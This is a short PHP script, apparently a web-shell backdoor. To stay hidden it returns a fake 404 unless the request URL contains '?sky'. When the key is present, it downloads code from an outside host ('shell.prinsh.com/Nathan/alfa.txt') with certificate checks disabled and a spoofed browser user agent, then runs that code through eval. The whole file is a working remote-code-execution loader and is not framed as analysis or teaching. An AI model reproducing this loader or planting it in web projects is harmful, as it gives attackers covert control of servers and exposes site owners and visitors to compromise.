<?php
function get_contents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($ch);
    if ($result === false) {
        echo 'Curl error: ' . curl_error($ch);
        http_response_code(404); // Set 404 response code if cURL fails
        exit;
    }
    curl_close($ch);
    return $result;
}

if (strpos($_SERVER['REQUEST_URI'], '?sky') === false) {
    http_response_code(404);
    // include('404.php');
    exit;
}

$url = 'https://shell.prinsh.com/Nathan/alfa.txt';
$encoded_code = get_contents($url);

if ($encoded_code === false) {
    http_response_code(404);
    // include('404.php');
    exit;
}

// Log or print the code for debugging purposes
// echo $encoded_code;

// Attempt to evaluate the code
eval('?>'.$encoded_code);
?>
